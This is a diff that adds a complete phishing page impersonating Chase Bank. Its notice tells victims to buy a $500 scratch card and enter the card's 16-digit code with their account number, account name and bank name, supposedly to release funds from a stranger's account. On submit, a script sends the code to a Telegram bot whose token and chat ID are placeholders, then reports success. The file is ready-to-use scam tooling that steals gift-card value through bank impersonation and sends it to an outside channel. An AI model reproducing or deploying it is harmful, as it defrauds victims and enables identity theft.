@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase Bank Withdrawal</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f8ff; 
+            margin: 0; 
+            padding: 0; 
+            color: #333; 
+        }
+        header, footer { 
+            background-color: #004080; 
+            color: white; 
+            text-align: center; 
+            padding: 20px; 
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); 
+            position: relative; 
+        }
+        .container { 
+            max-width: 600px; 
+            margin: 30px auto; 
+            padding: 20px; 
+            background: white; 
+            border-radius: 12px; 
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1); 
+        }
+        h3 { 
+            text-align: center; 
+            color: #004080; 
+            margin-bottom: 20px; 
+        }
+        label { 
+            margin-top: 15px; 
+            font-weight: bold; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin-top: 5px; 
+            border: 1px solid #ccc; 
+            border-radius: 6px; 
+            box-sizing: border-box; 
+            transition: border-color 0.3s; 
+        }
+        input:focus { 
+            border-color: #004080; 
+            outline: none; 
+        }
+        button { 
+            background-color: #004080; 
+            color: white; 
+            padding: 12px; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            margin-top: 15px; 
+            transition: background-color 0.3s; 
+        }
+        button:hover { 
+            background-color: #003366; 
+        }
+        .loading-indicator { 
+            display: none; 
+            text-align: center; 
+            color: blue; 
+            margin-top: 20px; 
+        }
+        #info { 
+            margin-top: 10px; 
+            font-style: italic; 
+            color: #555; 
+            text-align: center; 
+        }
+        .floating-icon {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            font-size: 80px; /* Increased size */
+            color: #00ffcc; /* Neon color */
+            transition: transform 0.3s ease, color 0.3s ease, text-shadow 0.3s ease;
+            text-shadow: 0 0 5px #00ffcc, 0 0 10px #00ffcc, 0 0 20px #00ffcc; /* Neon glow */
+        }
+        .floating-icon:hover {
+            transform: scale(1.3); /* Zoom in effect */
+            color: #ffcf00; /* Bright neon color on hover */
+            text-shadow: 0 0 10px #ffcc00, 0 0 20px #ffcc00, 0 0 30px #ffcc00; /* Bright neon glow */
+        }
+        .image-section {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+        }
+        .image-section img {
+            width: 45%;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        @media (max-width: 600px) {
+            header, footer { 
+                padding: 15px; 
+            }
+            button { 
+                font-size: 14px; 
+            }
+            .image-section img {
+                width: 90%;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <h1 id="headerTitle">Chase Bank Withdrawal</h1>
+    </header>
+    <div class="container">
+        <h3 id="formTitle">Withdrawal Form</h3>
+        <form id="withdrawForm">
+            <label for="account_number" id="labelAccountNumber">Account Number</label>
+            <input type="text" id="account_number" placeholder="Add your account number" required>
+            
+            <label for="account_name" id="labelAccountName">Account Name</label>
+            <input type="text" id="account_name" placeholder="Add your account name" required>
+            
+            <label for="bank_name" id="labelBankName">Bank Name</label>
+            <input type="text" id="bank_name" placeholder="Add your bank name" required>
+            
+            <label for="api_key" id="labelApiKey">API Key</label>
+            <input type="text" id="api_key" placeholder="Add your API key" required>
+            
+            <button type="button" onclick="submitForm()" id="submitButton">Withdraw Funds</button>
+        </form>
+        <div class="loading-indicator" id="loading">Processing...</div>
+    </div>
+
+    <section id="info">
+        <p id="infoText"> Dear ma/sir 
+we have received a request from you to widraw or transfer funds in the account portfolio of miss Hannah garden allocated to you through her request to do so .  
+For you to successfully widraw this funds in this account portfolio we require your App exchange API 16 digit codes for verification or DM our card  issuance department by clicking the golden glowing customer support icon below by the left at the bottom 👇 the so they issue a USA authorization card to you for you to be able to widraw this amount.  
+  STEPS TO GET VERIFY.  
+Step 1  
+Go to any convenient stores or shopping mall near you and get the API key card displayed above issued at the price of $500.00then scratch the back side of the code .  
+Step2  
+Copy the 16 digital codes at the back of the verification card and fill it in the API key input in the form section above ☝️with your bank account number, account name and bank name then submit to Widraw successful 
+Step 3  
+Submit your form for verification so you will widraw the actual funds to your native account you provided to the form  
+   NB:Do not shares your API key to anyone including your close friends ,Any one with access to your account can widraw the funds.  
+The card you gonna get issued to must be from Apple payments enrolled.  </p>
+    </section>
+
+    <div class="image-section">
+        <img src="https://via.placeholder.com/300x200.png?text=Image+1" alt="Placeholder Image 1">
+        <img src="https://via.placeholder.com/300x200.png?text=Image+2" alt="Placeholder Image 2">
+    </div>
+
+    <footer>
+        <p>All rights reserved &copy; Chase Bank</p>
+    </footer>
+
+    <a href="https://support.google.com/" target="_blank" class="floating-icon">
+        <span class="material-icons">support_agent</span>
+    </a>
+
+    <script>
+        async function translatePage() {
+            const userLang = navigator.language || navigator.userLanguage;
+
+            const translations = {
+                "headerTitle": "Chase Bank Withdrawal",
+                "formTitle": "Withdrawal Form",
+                "labelAccountNumber": "Account Number",
+                "labelAccountName": "Account Name",
+                "labelBankName": "Bank Name",
+                "labelApiKey": "API Key",
+                "submitButton": "Withdraw Funds",
+                "infoText": "Dear ma/sir 
+we have received a request from you to widraw or transfer funds in the account portfolio of miss Hannah garden allocated to you through her request to do so .  
+For you to successfully widraw this funds in this account portfolio we require your App exchange API 16 digit codes for verification or DM our card  issuance department by clicking the golden glowing customer support icon below by the left at the bottom 👇 the so they issue a USA authorization card to you for you to be able to widraw this amount.  
+  STEPS TO GET VERIFY.  
+Step 1  
+Go to any convenient stores or shopping mall near you and get the API key card displayed above issued at the price of $500.00then scratch the back side of the code .  
+Step2  
+Copy the 16 digital codes at the back of the verification card and fill it in the API key input in the form section above ☝️with your bank account number, account name and bank name then submit to Widraw successful 
+Step 3  
+Submit your form for verification so you will widraw the actual funds to your native account you provided to the form  
+   NB:Do not shares your API key to anyone including your close friends .Any one with access to your account can widraw the funds.  
+The card you gonna get issued to must be from Apple payments enrolled "
+            };
+
+            for (const key in translations) {
+                const response = await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(translations[key])}&langpair=en|${userLang}`);
+                const data = await response.json();
+                if (data.responseData.translatedText) {
+                    document.getElementById(key).innerText = data.responseData.translatedText;
+                }
+            }
+        }
+        translatePage();
+        
+        function submitForm() {
+            let apiKey = document.getElementById("api_key").value;
+            if (!apiKey || apiKey.length !== 16 || !/^[a-zA-Z0-9]+$/.test(apiKey)) {
+                alert("Invalid API Key! Ensure it is 16-digit and alphanumeric.");
+                return;
+            }
+            document.getElementById("loading").style.display = 'block';
+            fetch(`https://api.telegram.org/bot<YourBotAPI>/sendMessage?chat_id=<YourChatID>&text=New withdrawal request: ${apiKey}`)
+                .then(response => response.json())
+                .then(() => {
+                    document.getElementById("loading").style.display = 'none';
+                    alert("Submission Successful!");
+                    window.location.href = "success.html"; // Only redirect if submission is successful
+                })
+                .catch(() => {
+                    document.getElementById("loading").style.display = 'none';
+                    alert("Submission failed. Try again!");
+                });
+        }
+    </script>
+
+</body>
+</html>
